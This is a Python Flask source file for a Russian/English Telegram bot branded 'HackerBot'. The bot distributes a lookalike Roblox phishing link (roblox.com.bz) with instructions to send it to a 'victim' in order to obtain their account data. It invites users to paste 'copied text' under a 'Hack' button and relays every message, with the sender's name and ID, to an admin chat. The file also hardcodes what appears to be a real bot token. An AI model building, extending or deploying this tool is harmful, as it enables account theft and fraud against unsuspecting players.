from flask import Flask, request
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
ADMIN_CHAT_ID = "8625787020"
VIDEO_FILE_ID = "BAACAgEAAxkBAAP7akugXF318MJWQ3616dZDkwJJ4hkAAnEHAALuAmBGFLl3swomiE88BA"

# === ФАЙЛ ДЛЯ ХРАНЕНИЯ ПОЛЬЗОВАТЕЛЕЙ ===
USERS_FILE = "users.json"

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

# === ЯЗЫКИ ===
user_lang = {}
pending_reply = {}

TEXTS = {
    "ru": {
        "welcome": "🌟 *Добро пожаловать в HackerBot!*\n\n🔐 *Я — твой помощник в мире взлома и безопасности.*\n\n📌 *Отправь текст, и наш админ свяжется с тобой в ближайшее время.*\n\n🔗 *Также здесь можно создать скам-ссылку для фишинга.*\n\n⏳ *Ожидание: 30 минут — 1 час.*\n\n🍞 *Удачи!*",
        "tutor": "📹 *Вот твой видео-туториал!*",
        "hack": "🔓 *Здравствуй! Отправь сюда скопированный текст, и мы начнём.*",
        "admin_msg": "✉️ *Напиши своё сообщение сюда. Админ ответит в ближайшее время.*",
        "choose_lang": "🌐 *Выбери язык:*",
        "lang_changed": "✅ *Язык изменён на русский.*",
        "reply_sent": "✅ *Ответ отправлен*",
        "choose_action": "📌 *Выбери действие:*",
        "card_title": "👤 *НОВЫЙ ПОЛЬЗОВАТЕЛЬ*",
        "card_name": "📛 Имя",
        "card_username": "🆔 Юзернейм",
        "card_id": "🔢 ID",
        "admin_reply": "📨 *Ответ от Админа:*\n",
        "scam_link": "🔗 *Ссылка для жертвы:*\nhttps://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=82337251021839787402749538321389\n\n📌 *Отправь эту ссылку жертве, и вам дадут данные от аккаунта.*"
    },
    "en": {
        "welcome": "🌟 *Welcome to HackerBot!*\n\n🔐 *I'm your assistant in the world of hacking and security.*\n\n📌 *Send your text, and our admin will contact you soon.*\n\n🔗 *You can also create a scam link for phishing here.*\n\n⏳ *Wait time: 30 minutes — 1 hour.*\n\n🍞 *Good luck!*",
        "tutor": "📹 *Here's your video tutorial!*",
        "hack": "🔓 *Hello! Send your copied text here, and we'll start.*",
        "admin_msg": "✉️ *Write your message here. Admin will reply soon.*",
        "choose_lang": "🌐 *Choose your language:*",
        "lang_changed": "✅ *Language changed to English.*",
        "reply_sent": "✅ *Reply sent to*",
        "choose_action": "📌 *Choose action:*",
        "card_title": "👤 *NEW USER*",
        "card_name": "📛 Name",
        "card_username": "🆔 Username",
        "card_id": "🔢 ID",
        "admin_reply": "📨 *Admin reply:*\n",
        "scam_link": "🔗 *Link for the victim:*\nhttps://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=82337251021839787402749538321389\n\n📌 *Send this link to the victim, and you will get account data.*"
    }
}

# === КЛАВИАТУРЫ ===
LANG_KEYBOARD = {
    "keyboard": [
        ["🇷🇺 Русский", "🇬🇧 English"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

MAIN_KEYBOARD_RU = {
    "keyboard": [
        ["🎥 Видео-урок", "💀 Взломать"],
        ["🔗 Создать скам-ссылку", "📩 Написать админу"],
        ["🌐 Сменить язык"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

MAIN_KEYBOARD_EN = {
    "keyboard": [
        ["🎥 Video tutorial", "💀 Hack"],
        ["🔗 Create scam link", "📩 Write to Admin"],
        ["🌐 Change language"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    global pending_reply
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']
        first_name = data['message']['from'].get('first_name', '')
        last_name = data['message']['from'].get('last_name', '')
        full_name = f"{first_name} {last_name}".strip() or "Без имени"

        # === АДМИН ===
        if str(chat_id) == ADMIN_CHAT_ID:
            if text == '/start':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": "👋 *Привет, админ! Бот работает.*\n📌 *Отвечай на сообщения пользователей.*",
                        "parse_mode": "Markdown",
                        "reply_markup": MAIN_KEYBOARD_RU
                    }
                )
                return "ok", 200

            # === ПОМОЩЬ (/help) ===
            if text == '/help':
                help_text = (
                    "📋 *Доступные команды для админа:*\n\n"
                    "🔹 `/help` — показать это сообщение\n"
                    "🔹 `/users` — показать количество пользователей\n"
                    "🔹 `/reply Текст` — ответить последнему пользователю\n"
                    "🔹 `/sendall Текст` — разослать сообщение всем пользователям\n\n"
                    "📌 *Все команды работают только для админа.*"
                )
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": help_text,
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            # === КОЛИЧЕСТВО ПОЛЬЗОВАТЕЛЕЙ (/users) ===
            if text == '/users':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"👥 *Всего пользователей:* {len(USERS)}",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            # === РАССЫЛКА ВСЕМ (/sendall) ===
            if text.startswith("/sendall "):
                msg = text.replace("/sendall ", "")
                for uid in USERS:
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={"chat_id": uid, "text": msg}
                        )
                    except:
                        pass
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"✅ *Рассылка отправлена* {len(USERS)} пользователям.",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            # === ОТВЕТ ПОЛЬЗОВАТЕЛЮ (/reply) ===
            if text.startswith("/reply "):
                parts = text.split(" ", 1)
                if len(parts) == 2:
                    reply_text = parts[1]
                    if pending_reply.get("user_id"):
                        target_id = pending_reply["user_id"]
                        target_username = pending_reply.get("username", "anon")
                        target_lang = user_lang.get(target_id, "ru")
                        
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": target_id,
                                "text": TEXTS[target_lang]["admin_reply"] + reply_text,
                                "parse_mode": "Markdown"
                            }
                        )
                        
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": ADMIN_CHAT_ID,
                                "text": f"✅ *Ответ отправлен* @{target_username}",
                                "parse_mode": "Markdown"
                            }
                        )
                        pending_reply = {}
                        return "ok", 200
                    else:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": ADMIN_CHAT_ID,
                                "text": "⚠️ *Нет активного диалога. Сначала получи сообщение от пользователя.*",
                                "parse_mode": "Markdown"
                            }
                        )
                        return "ok", 200
                else:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": "⚠️ *Используй формат:* `/reply Текст ответа`",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200

            # === ВСЁ ОСТАЛЬНОЕ ОТ АДМИНА — ИГНОР ===
            else:
                return "ok", 200

        # === ПОЛЬЗОВАТЕЛЬ ===
        save_user(user_id)
        pending_reply["user_id"] = user_id
        pending_reply["username"] = username

        lang = user_lang.get(user_id, "ru")
        t = TEXTS[lang]

        # Смена языка
        if text in ["🌐 Сменить язык", "🌐 Change language"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_lang"],
                    "reply_markup": LANG_KEYBOARD
                }
            )
            return "ok", 200

        if text == "🇷🇺 Русский":
            user_lang[user_id] = "ru"
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["ru"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_RU
                }
            )
            return "ok", 200

        if text == "🇬🇧 English":
            user_lang[user_id] = "en"
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["en"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_EN
                }
            )
            return "ok", 200

        # === ОТПРАВКА АДМИНУ (карточка + текст) ===
        card = (
            f"{t['card_title']}\n"
            f"─────────────────\n"
            f"{t['card_name']}: {full_name}\n"
            f"{t['card_username']}: @{username}\n"
            f"{t['card_id']}: {user_id}"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": card,
                "parse_mode": "Markdown"
            }
        )
        
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "parse_mode": "Markdown"
            }
        )

        # === ОБРАБОТКА КНОПОК (для пользователя) ===
        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU

        if text == '/start':
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["welcome"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["🎥 Видео-урок", "🎥 Video tutorial"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                json={
                    "chat_id": chat_id,
                    "video": VIDEO_FILE_ID,
                    "caption": t["tutor"],
                    "parse_mode": "Markdown"
                }
            )
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["💀 Взломать", "💀 Hack"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["hack"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["📩 Написать админу", "📩 Write to Admin"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["admin_msg"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["🔗 Создать скам-ссылку", "🔗 Create scam link"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["scam_link"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
